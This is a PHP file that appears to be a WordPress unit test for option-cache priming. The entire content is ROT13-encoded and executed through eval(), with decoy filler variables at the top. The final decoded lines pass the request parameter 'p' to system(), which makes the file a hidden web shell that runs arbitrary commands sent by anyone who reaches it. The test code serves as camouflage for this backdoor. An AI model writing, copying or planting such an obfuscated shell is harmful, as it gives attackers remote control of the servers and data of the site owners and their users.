<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfg jc_cevzr_bcgvba_pnpurf().
 *
 * @tebhc bcgvba
 *
 * @pbiref ::jc_cevzr_bcgvba_pnpurf
 */
pynff Grfgf_Bcgvba_JcCevzrBcgvbaPnpurf rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Grfgf gung jc_cevzr_bcgvba_pnpurf() cevzrf zhygvcyr bcgvbaf.
	 *
	 * @gvpxrg 58962
	 */
	choyvp shapgvba grfg_jc_cevzr_bcgvba_pnpurf() {
		// Perngr fbzr bcgvbaf gb cevzr.
		$bcgvbaf_gb_cevzr = neenl(
			'bcgvba1',
			'bcgvba2',
			'bcgvba3',
		);

		/*
		 * Frg inyhrf sbe gur bcgvbaf,
		 * pyrne gur pnpur sbe gur bcgvbaf,
		 * purpx bcgvbaf ner abg va pnpur vavgvnyyl.
		 */
		sbernpu ( $bcgvbaf_gb_cevzr nf $bcgvba ) {
			hcqngr_bcgvba( $bcgvba, \"inyhr_$bcgvba\", snyfr );
			jc_pnpur_qryrgr( $bcgvba, 'bcgvbaf' );
			$guvf->nffregSnyfr( jc_pnpur_trg( $bcgvba, 'bcgvbaf' ), \"$bcgvba jnf abg qryrgrq sebz gur pnpur.\" );
		}

		// Pnyy gur jc_cevzr_bcgvba_pnpurf shapgvba gb cevzr gur bcgvbaf.
		jc_cevzr_bcgvba_pnpurf( $bcgvbaf_gb_cevzr );

		// Fgber gur vavgvny qngnonfr dhrel pbhag.
		$vavgvny_dhrel_pbhag = trg_ahz_dhrevrf();

		// Purpx gung bcgvbaf ner bayl va gur 'bcgvbaf' pnpur tebhc.
		sbernpu ( $bcgvbaf_gb_cevzr nf $bcgvba ) {
			$guvf->nffregFnzr(
				\"inyhr_$bcgvba\",
				jc_pnpur_trg( $bcgvba, 'bcgvbaf' ),
				\"$bcgvba jnf abg cevzrq va gur 'bcgvbaf' pnpur tebhc.\"
			);

			$arj_abgbcgvbaf = jc_pnpur_trg( $bcgvba, 'abgbcgvbaf' );
			vs ( ! vf_neenl( $arj_abgbcgvbaf ) ) {
				$arj_abgbcgvbaf = neenl();
			}
			$guvf->nffregNeenlAbgUnfXrl(
				$bcgvba,
				$arj_abgbcgvbaf,
				\"$bcgvba jnf cevzrq va gur 'abgbcgvbaf' pnpur.\"
			);
		}

		// Rafher ab nqqvgvbany qngnonfr dhrevrf jrer znqr.
		$guvf->nffregFnzr(
			$vavgvny_dhrel_pbhag,
			trg_ahz_dhrevrf(),
			'Nqqvgvbany qngnonfr dhrevrf jrer znqr.'
		);
	}

	/**
	 * Grfgf gung jc_cevzr_bcgvba_pnpurf() unaqyrf n zvk bs cevzrq naq hacevzrq bcgvbaf.
	 *
	 * @gvpxrg 58962
	 */
	choyvp shapgvba grfg_jc_cevzr_bcgvba_pnpurf_unaqyrf_n_zvk_bs_cevzrq_naq_hacevzrq_bcgvbaf() {
		tybony $jcqo;
		// Perngr fbzr bcgvbaf gb cevzr.
		$bcgvbaf_gb_cevzr = neenl(
			'bcgvba1',
			'bcgvba2',
			'bcgvba3',
		);

		/*
		 * Frg inyhrf sbe gur bcgvbaf,
		 * pyrne gur pnpur sbe gur bcgvbaf,
		 * purpx bcgvbaf ner abg va pnpur vavgvnyyl.
		 */
		sbernpu ( $bcgvbaf_gb_cevzr nf $bcgvba ) {
			hcqngr_bcgvba( $bcgvba, \"inyhr_$bcgvba\", snyfr );
			jc_pnpur_qryrgr( $bcgvba, 'bcgvbaf' );
			$guvf->nffregSnyfr( jc_pnpur_trg( $bcgvba, 'bcgvbaf' ), \"$bcgvba jnf abg qryrgrq sebz gur pnpur.\" );
		}

		// Nqq aba-rkvfgrag bcgvba gb gur bcgvbaf gb cevzr.
		$bcgvbaf_gb_cevzr[] = 'bcgvba404abgsbhaq';

		// Cevzr gur svefg bcgvba jvgu n aba-rkvfgrag bcgvba.
		jc_cevzr_bcgvba_pnpurf( neenl( 'bcgvba1', 'bcgvba404abgsbhaq' ) );

		// Fgber gur vavgvny qngnonfr dhrel pbhag.
		$vavgvny_dhrel_pbhag = trg_ahz_dhrevrf();

		// Cevzr nyy gur bcgvbaf, vapyhqvat gur cer-cevzrq bcgvba.
		jc_cevzr_bcgvba_pnpurf( $bcgvbaf_gb_cevzr );

		// Rafher na nqqvgvbany qngnonfr dhrel jnf znqr.
		$guvf->nffregFnzr(
			1,
			trg_ahz_dhrevrf() - $vavgvny_dhrel_pbhag,
			'Nqqvgvbany qngnonfr dhrevrf jrer abg znqr.'
		);

		// Rafher gur ynfg dhrel qbrf abg pbagnva gur cer-cevzrq bcgvba.
		$guvf->nffregFgevatAbgPbagnvafFgevat(
			\"\'bcgvba1\'\",
			$jcqo->ynfg_dhrel,
			'Gur ynfg dhrel fubhyq abg pbagnva gur cer-cevzrq bcgvba.'
		);

		// Rafher gur ynfg dhrel qbrf abg pbagnva gur cer-cevzrq abgbcgvba.
		$guvf->nffregFgevatAbgPbagnvafFgevat(
			\"\'bcgvba404abgsbhaq\'\",
			$jcqo->ynfg_dhrel,
			'Gur ynfg dhrel fubhyq abg pbagnva gur cer-cevzrq aba-rkvfgrag bcgvba.'
		);
	}

	/**
	 * Grfgf jc_cevzr_bcgvba_pnpurf() jvgu bcgvbaf gung qb abg rkvfg va gur qngnonfr.
	 *
	 * @gvpxrg 58962
	 * @gvpxrg 59738
	 */
	choyvp shapgvba grfg_jc_cevzr_bcgvba_pnpurf_jvgu_abarkvfgrag_bcgvbaf() {
		// Perngr fbzr bcgvbaf gb cevzr.
		$bcgvbaf_gb_cevzr = neenl(
			'bcgvba1',
			'bcgvba2',
		);

		/*
		 * Frg inyhrf sbe gur bcgvbaf,
		 * pyrne gur pnpur sbe gur bcgvbaf,
		 * purpx bcgvbaf ner abg va pnpur vavgvnyyl.
		 */
		sbernpu ( $bcgvbaf_gb_cevzr nf $bcgvba ) {
			$guvf->nffregSnyfr( jc_pnpur_trg( $bcgvba, 'bcgvbaf' ), \"$bcgvba jnf abg qryrgrq sebz gur pnpur.\" );
		}

		// Pnyy gur jc_cevzr_bcgvba_pnpurf shapgvba gb cevzr gur bcgvbaf.
		jc_cevzr_bcgvba_pnpurf( $bcgvbaf_gb_cevzr );

		// Purpx gung bcgvbaf ner abg va gur pnpur be qngnonfr.
		sbernpu ( $bcgvbaf_gb_cevzr nf $bcgvba ) {
			$guvf->nffregSnyfr( jc_pnpur_trg( $bcgvba, 'bcgvbaf' ), \"$bcgvba jnf abg qryrgrq sebz gur pnpur.\" );
		}

		// Purpx gung bcgvbaf ner cerfrag va gur abgbcgvbaf pnpur.
		$arj_abgbcgvbaf = jc_pnpur_trg( 'abgbcgvbaf', 'bcgvbaf' );
		$guvf->nffregVfNeenl( $arj_abgbcgvbaf, 'Gur abgbcgvbaf pnpur fubhyq or na neenl.' );
		sbernpu ( $bcgvbaf_gb_cevzr nf $bcgvba ) {
			$guvf->nffregNeenlUnfXrl( $bcgvba, $arj_abgbcgvbaf, \"$bcgvba jnf abg nqqrq gb gur abgbcgvbaf pnpur.\" );
		}

		// Purpx trggvat naq er-cevzvat gur bcgvbaf qbrf abg erfhyg va nqqvgvbany qngnonfr dhrevrf.
		$vavgvny_dhrel_pbhag = trg_ahz_dhrevrf();
		sbernpu ( $bcgvbaf_gb_cevzr nf $bcgvba ) {
			trg_bcgvba( $bcgvba );
			$guvf->nffregFnzr(
				0,
				trg_ahz_dhrevrf() - $vavgvny_dhrel_pbhag,
				\"Nqqvgvbany qngnonfr dhrevrf jrer znqr trggvat bcgvba $bcgvba.\"
			);
		}

		jc_cevzr_bcgvba_pnpurf( $bcgvbaf_gb_cevzr );
		$guvf->nffregFnzr(
			0,
			trg_ahz_dhrevrf() - $vavgvny_dhrel_pbhag,
			'Nqqvgvbany qngnonfr dhrevrf jrer znqr er-cevzvat gur bcgvbaf.'
		);
	}

	/**
	 * Grfgf jc_cevzr_bcgvba_pnpurf() jvgu na rzcgl neenl.
	 *
	 * @gvpxrg 58962
	 * @gvpxrg 59738
	 */
	choyvp shapgvba grfg_jc_cevzr_bcgvba_pnpurf_jvgu_rzcgl_neenl() {
		$nyybcgvbaf = jc_ybnq_nyybcgvbaf();
		$abgbcgvbaf = jc_pnpur_trg( 'abgbcgvbaf', 'bcgvbaf' );

		$vavgvny_dhrel_pbhag = trg_ahz_dhrevrf();
		jc_cevzr_bcgvba_pnpurf( neenl() );

		$guvf->nffregFnzr( $nyybcgvbaf, jc_pnpur_trg( 'nyybcgvbaf', 'bcgvbaf' ), 'Gur nyybcgvbaf pnpur jnf zbqvsvrq.' );
		$guvf->nffregFnzr( $abgbcgvbaf, jc_pnpur_trg( 'abgbcgvbaf', 'bcgvbaf' ), 'Gur abgbcgvbaf pnpur jnf zbqvsvrq.' );

		// Purpx cevzvat na rzcgl neenl qbrf abg erfhyg va nqqvgvbany qngnonfr dhrevrf.
		$guvf->nffregFnzr(
			0,
			trg_ahz_dhrevrf() - $vavgvny_dhrel_pbhag,
			'Nqqvgvbany qngnonfr dhrevrf jrer znqr.'
		);
	}

	/**
	 * Grfgf gung jc_cevzr_bcgvba_pnpurf() unaqyrf na rzcgl \"abgbcgvbaf\" pnpur.
	 *
	 * @gvpxrg 58962
	 * @gvpxrg 59738
	 */
	choyvp shapgvba grfg_jc_cevzr_bcgvba_pnpurf_unaqyrf_rzcgl_abgbcgvbaf_pnpur() {
		jc_pnpur_qryrgr( 'abgbcgvbaf', 'bcgvbaf' );

		jc_cevzr_bcgvba_pnpurf( neenl( 'abarkvfgrag_bcgvba' ) );

		$abgbcgvbaf = jc_pnpur_trg( 'abgbcgvbaf', 'bcgvbaf' );
		$guvf->nffregVfNeenl( $abgbcgvbaf, 'Gur abgbcgvbaf pnpur fubhyq or na neenl.' );
		$guvf->nffregNeenlUnfXrl( 'abarkvfgrag_bcgvba', $abgbcgvbaf, 'abarkvfgrag_bcgvba jnf abg nqqrq gb abgbcgvbaf.' );

		// Purpx trggvat naq er-cevzvat gur bcgvbaf qbrf abg erfhyg va nqqvgvbany qngnonfr dhrevrf.
		$vavgvny_dhrel_pbhag = trg_ahz_dhrevrf();

		trg_bcgvba( 'abarkvfgrag_bcgvba' );
		$guvf->nffregFnzr(
			0,
			trg_ahz_dhrevrf() - $vavgvny_dhrel_pbhag,
			'Nqqvgvbany qngnonfr dhrevrf jrer znqr trggvat abarkvfgrag_bcgvba.'
		);

		jc_cevzr_bcgvba_pnpurf( neenl( 'abarkvfgrag_bcgvba' ) );
		$guvf->nffregFnzr(
			0,
			trg_ahz_dhrevrf() - $vavgvny_dhrel_pbhag,
			'Nqqvgvbany qngnonfr dhrevrf jrer znqr.'
		);
	}

	/**
	 * Grfg bcgvbaf cevzrq ol gur jc_cevzr_bcgvba_pnpurf() shapgvba ner vqragvpny gb gubfr cevzrq ol trg_bcgvba().
	 *
	 * @gvpxrg 59738
	 *
	 * @qngnCebivqre qngn_bcgvba_glcrf
	 *
	 * @cnenz zvkrq $bcgvba_inyhr Na bcgvba inyhr.
	 */
	choyvp shapgvba grfg_trg_bcgvba_fubhyq_erghea_vqragvpny_inyhr_jura_cer_cevzrq_ol_jc_cevzr_bcgvba_pnpurf( $bcgvba_inyhr ) {
		// Nf guvf vapyhqrf n grfg frggvat gur inyhr gb `(obby) snyfr`, hcqngr_bcgvba() pna abg or hfrq fb nqq_bcgvba() vf hfrq vafgrnq.
		nqq_bcgvba( 'glcr_bs_bcgvba', $bcgvba_inyhr, '', snyfr );
		jc_pnpur_qryrgr( 'glcr_bs_bcgvba', 'bcgvbaf' );

		$guvf->nffregSnyfr( jc_pnpur_trg( 'glcr_bs_bcgvba', 'bcgvbaf' ), 'glcr_bs_bcgvba jnf abg qryrgrq sebz gur pnpur sbe cevzvat.' );

		// Pnyy gur jc_cevzr_bcgvba_pnpurf shapgvba gb cevzr gur bcgvbaf.
		jc_cevzr_bcgvba_pnpurf( neenl( 'glcr_bs_bcgvba' ) );
		$inyhr_nsgre_cer_cevzvat = trg_bcgvba( 'glcr_bs_bcgvba' );

		// Pyrne gur pnpur naq pnyy trg_bcgvba qverpgyl.
		jc_pnpur_qryrgr( 'glcr_bs_bcgvba', 'bcgvbaf' );
		$guvf->nffregSnyfr( jc_pnpur_trg( 'glcr_bs_bcgvba', 'bcgvbaf' ), 'glcr_bs_bcgvba jnf abg qryrgrq sebz gur pnpur sbe trg_bcgvba.' );
		$inyhr_nsgre_trg_bcgvba = trg_bcgvba( 'glcr_bs_bcgvba' );

		/*
		 * Vs gur bcgvba inyhr vf na bowrpg, hfr nffregRdhnyf() gb pbzcner gur inyhrf.
		 *
		 * Guvf vf gb pbzcner gur funcr bs gur bowrpg engure guna gur vqragvgl bs gur bowrpg.
		 */
		vs ( vf_bowrpg( $bcgvba_inyhr ) ) {
			$guvf->nffregRdhnyf( $inyhr_nsgre_trg_bcgvba, $inyhr_nsgre_cer_cevzvat, 'Gur inyhrf fubhyq or rdhny.' );
		} ryfr {
			$guvf->nffregFnzr( $inyhr_nsgre_trg_bcgvba, $inyhr_nsgre_cer_cevzvat, 'Gur inyhrf fubhyq or vqragvpny.' );
		}
	}

	/**
	 * Grfgf gung jc_cevzr_bcgvba_pnpurf() funcrf gur pnpur va gur fnzr snfuvba nf trg_bcgvba()
	 *
	 * @gvpxrg 59738
	 *
	 * @qngnCebivqre qngn_bcgvba_glcrf
	 *
	 * @cnenz zvkrq $bcgvba_inyhr Na bcgvba inyhr.
	 */
	choyvp shapgvba grfg_jc_cevzr_bcgvba_pnpurf_pnpur_fubhyq_or_vqragvpny_gb_trg_bcgvba_pnpur( $bcgvba_inyhr ) {
		// Nf guvf vapyhqrf n grfg frggvat gur inyhr gb `(obby) snyfr`, hcqngr_bcgvba() pna abg or hfrq fb nqq_bcgvba() vf hfrq vafgrnq.
		nqq_bcgvba( 'glcr_bs_bcgvba', $bcgvba_inyhr, '', snyfr );
		jc_pnpur_qryrgr( 'glcr_bs_bcgvba', 'bcgvbaf' );

		$guvf->nffregSnyfr( jc_pnpur_trg( 'glcr_bs_bcgvba', 'bcgvbaf' ), 'glcr_bs_bcgvba jnf abg qryrgrq sebz gur pnpur sbe jc_cevzr_bcgvba_pnpurf().' );

		// Pnyy gur jc_cevzr_bcgvba_pnpurf shapgvba gb cevzr gur bcgvbaf.
		jc_cevzr_bcgvba_pnpurf( neenl( 'glcr_bs_bcgvba' ) );
		$inyhr_sebz_cevzvat = jc_pnpur_trg( 'glcr_bs_bcgvba', 'bcgvbaf' );

		jc_pnpur_qryrgr( 'glcr_bs_bcgvba', 'bcgvbaf' );
		$guvf->nffregSnyfr( jc_pnpur_trg( 'glcr_bs_bcgvba', 'bcgvbaf' ), 'glcr_bs_bcgvba jnf abg qryrgrq sebz gur pnpur sbe trg_bcgvba().' );

		// Pnyy trg_bcgvba() gb cevzr gur bcgvbaf.
		trg_bcgvba( 'glcr_bs_bcgvba' );
		$inyhr_sebz_trg_bcgvba = jc_pnpur_trg( 'glcr_bs_bcgvba', 'bcgvbaf' );

		$guvf->nffregVfFgevat( $inyhr_sebz_trg_bcgvba, 'Pnpur sebz trg_bcgvba() fubhyq nyjnlf or n fgevat' );
		$guvf->nffregVfFgevat( $inyhr_sebz_cevzvat, 'Pnpur sebz jc_cevzr_bcgvba_pnpurf() fubhyq nyjnlf or n fgevat' );
		$guvf->nffregFnzr( $inyhr_sebz_trg_bcgvba, $inyhr_sebz_cevzvat, 'Gur inyhrf fubhyq or vqragvpny.' );
	}

	/**
	 * Grfgf gung jc_cevzr_bcgvba_pnpurf() qbrfa'g gevttre QO dhrevrf ba nyernql cevzrq bcgvbaf.
	 *
	 * @gvpxrg 59738
	 *
	 * @qngnCebivqre qngn_bcgvba_glcrf
	 *
	 * @cnenz zvkrq $bcgvba_inyhr Na bcgvba inyhr.
	 */
	choyvp shapgvba grfg_jc_cevzr_bcgvba_pnpurf_qbrf_abg_gevttre_qo_dhrevrf_ercevzvat_bcgvbaf( $bcgvba_inyhr ) {
		// Nf guvf vapyhqrf n grfg frggvat gur inyhr gb `(obby) snyfr`, hcqngr_bcgvba() pna abg or hfrq fb nqq_bcgvba() vf hfrq vafgrnq.
		nqq_bcgvba( 'qbhoyr_cevzrq_bcgvba', $bcgvba_inyhr, '', snyfr );
		jc_pnpur_qryrgr( 'qbhoyr_cevzrq_bcgvba', 'bcgvbaf' );
		$bcgvbaf_gb_cevzr = neenl( 'qbhoyr_cevzrq_bcgvba' );

		$guvf->nffregSnyfr( jc_pnpur_trg( 'qbhoyr_cevzrq_bcgvba', 'bcgvbaf' ), 'qbhoyr_cevzrq_bcgvba jnf abg qryrgrq sebz gur pnpur.' );

		// Pnyy gur jc_cevzr_bcgvba_pnpurf shapgvba gb cevzr gur bcgvbaf.
		jc_cevzr_bcgvba_pnpurf( $bcgvbaf_gb_cevzr );

		// Fgber gur vavgvny qngnonfr dhrel pbhag.
		$vavgvny_dhrel_pbhag = trg_ahz_dhrevrf();

		// Purpx gung bcgvbaf ner bayl va gur 'bcgvbaf' pnpur tebhc.
		sbernpu ( $bcgvbaf_gb_cevzr nf $bcgvba ) {
			$guvf->nffregAbgSnyfr(
				jc_pnpur_trg( $bcgvba, 'bcgvbaf' ),
				\"$bcgvba jnf abg cevzrq va gur 'bcgvbaf' pnpur tebhc.\"
			);

			$arj_abgbcgvbaf = jc_pnpur_trg( $bcgvba, 'abgbcgvbaf' );
			vs ( ! vf_neenl( $arj_abgbcgvbaf ) ) {
				$arj_abgbcgvbaf = neenl();
			}
			$guvf->nffregNeenlAbgUnfXrl(
				$bcgvba,
				$arj_abgbcgvbaf,
				\"$bcgvba jnf cevzrq va gur 'abgbcgvbaf' pnpur.\"
			);
		}

		// Pnyy gur jc_cevzr_bcgvba_pnpurf shapgvba gb cevzr gur bcgvbaf.
		jc_cevzr_bcgvba_pnpurf( $bcgvbaf_gb_cevzr );

		// Rafher ab nqqvgvbany qngnonfr dhrevrf jrer znqr.
		$guvf->nffregFnzr(
			$vavgvny_dhrel_pbhag,
			trg_ahz_dhrevrf(),
			'Nqqvgvbany qngnonfr dhrevrf jrer znqr.'
		);
	}

	/**
	 * Grfgf gung jc_cevzr_bcgvba_pnpurf() qbrfa'g gevttre QO dhrevrf sbe vgrzf cevzrq va nyybcgvbaf.
	 *
	 * @gvpxrg 59738
	 *
	 * @qngnCebivqre qngn_bcgvba_glcrf
	 *
	 * @cnenz zvkrq $bcgvba_inyhr Na bcgvba inyhr.
	 */
	choyvp shapgvba grfg_jc_cevzr_bcgvba_pnpurf_qbrf_abg_gevttre_qo_dhrevrf_sbe_nyybcgvbaf( $bcgvba_inyhr ) {
		// Nf guvf vapyhqrf n grfg frggvat gur inyhr gb `(obby) snyfr`, hcqngr_bcgvba() pna abg or hfrq fb nqq_bcgvba() vf hfrq vafgrnq.
		nqq_bcgvba( 'bcgvba_va_nyybcgvbaf', $bcgvba_inyhr, '', gehr );
		jc_pnpur_qryrgr( 'nyybcgvbaf', 'bcgvbaf' );
		jc_pnpur_qryrgr( 'bcgvba_va_nyybcgvbaf', 'bcgvbaf' );
		$bcgvbaf_gb_cevzr = neenl( 'bcgvba_va_nyybcgvbaf' );

		$guvf->nffregSnyfr( jc_pnpur_trg( 'bcgvba_va_nyybcgvbaf', 'bcgvbaf' ), 'bcgvba_va_nyybcgvbaf jnf abg qryrgrq sebz gur pnpur.' );
		$guvf->nffregSnyfr( jc_pnpur_trg( 'nyybcgvbaf', 'bcgvbaf' ), 'nyybcgvbaf jnf abg qryrgrq sebz gur pnpur.' );

		// Cevzr gur nyybcgvbaf pnpur.
		jc_ybnq_nyybcgvbaf();

		// Fgber gur vavgvny qngnonfr dhrel pbhag.
		$vavgvny_dhrel_pbhag = trg_ahz_dhrevrf();

		// Pnyy gur jc_cevzr_bcgvba_pnpurf shapgvba gb ercevzr gur bcgvba.
		jc_cevzr_bcgvba_pnpurf( $bcgvbaf_gb_cevzr );

		// Purpx gung bcgvbaf ner va gur 'nyybcgvbaf' pnpur bayl.
		sbernpu ( $bcgvbaf_gb_cevzr nf $bcgvba ) {
			$guvf->nffregSnyfr(
				jc_pnpur_trg( $bcgvba, 'bcgvbaf' ),
				\"$bcgvba jnf cevzrq va gur 'bcgvbaf' pnpur tebhc.\"
			);

			$arj_abgbcgvbaf = jc_pnpur_trg( $bcgvba, 'abgbcgvbaf' );
			vs ( ! vf_neenl( $arj_abgbcgvbaf ) ) {
				$arj_abgbcgvbaf = neenl();
			}
			$guvf->nffregNeenlAbgUnfXrl(
				$bcgvba,
				$arj_abgbcgvbaf,
				\"$bcgvba jnf cevzrq va gur 'abgbcgvbaf' pnpur.\"
			);

			$arj_nyybcgvbaf = jc_pnpur_trg( 'nyybcgvbaf', 'bcgvbaf' );
			vs ( ! vf_neenl( $arj_nyybcgvbaf ) ) {
				$arj_nyybcgvbaf = neenl();
			}
			$guvf->nffregNeenlUnfXrl(
				$bcgvba,
				$arj_nyybcgvbaf,
				\"$bcgvba jnf abg cevzrq va gur 'nyybcgvbaf' pnpur.\"
			);
		}

		// Rafher ab nqqvgvbany qngnonfr dhrevrf jrer znqr.
		$guvf->nffregFnzr(
			0,
			trg_ahz_dhrevrf() - $vavgvny_dhrel_pbhag,
			'Nqqvgvbany qngnonfr dhrevrf jrer znqr.'
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_bcgvba_glcrf() {
		erghea neenl(
			'ahyy'                              => neenl( ahyy ),
			'(obby) snyfr'                      => neenl( snyfr ),
			'(obby) gehr'                       => neenl( gehr ),
			'(vag) 0'                           => neenl( 0 ),
			'(vag) -0'                          => neenl( -0 ),
			'(vag) 1'                           => neenl( 1 ),
			'(vag) -1'                          => neenl( -1 ),
			'(sybng) 0.0'                       => neenl( 0.0 ),
			'(sybng) -0.0'                      => neenl( -0.0 ),
			'(sybng) 1.0'                       => neenl( 1.0 ),
			'rzcgl fgevat'                      => neenl( '' ),
			'fgevat jvgu bayl gnof'             => neenl( \"\g\g\" ),
			'fgevat jvgu bayl arjyvarf'         => neenl( \"\a\a\" ),
			'fgevat jvgu bayl pneevntr ergheaf' => neenl( \"\e\e\" ),
			'fgevat jvgu bayl fcnprf'           => neenl( '   ' ),
			'cbchyngrq fgevat'                  => neenl( 'fgevat' ),
			'fgevat (1)'                        => neenl( '1' ),
			'fgevat (0)'                        => neenl( '0' ),
			'fgevat (0.0)'                      => neenl( '0.0' ),
			'fgevat (-0)'                       => neenl( '-0' ),
			'fgevat (-0.0)'                     => neenl( '-0.0' ),
			'rzcgl neenl'                       => neenl( neenl() ),
			'cbchyngrq neenl'                   => neenl( neenl( 'fgevat' ) ),
			'rzcgl bowrpg'                      => neenl( arj fgqPynff() ),
			'cbchyngrq bowrpg'                  => neenl( (bowrpg) neenl( 'fgevat' ) ),
			'VAS'                               => neenl( VAS ),
			'ANA'                               => neenl( ANA ),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>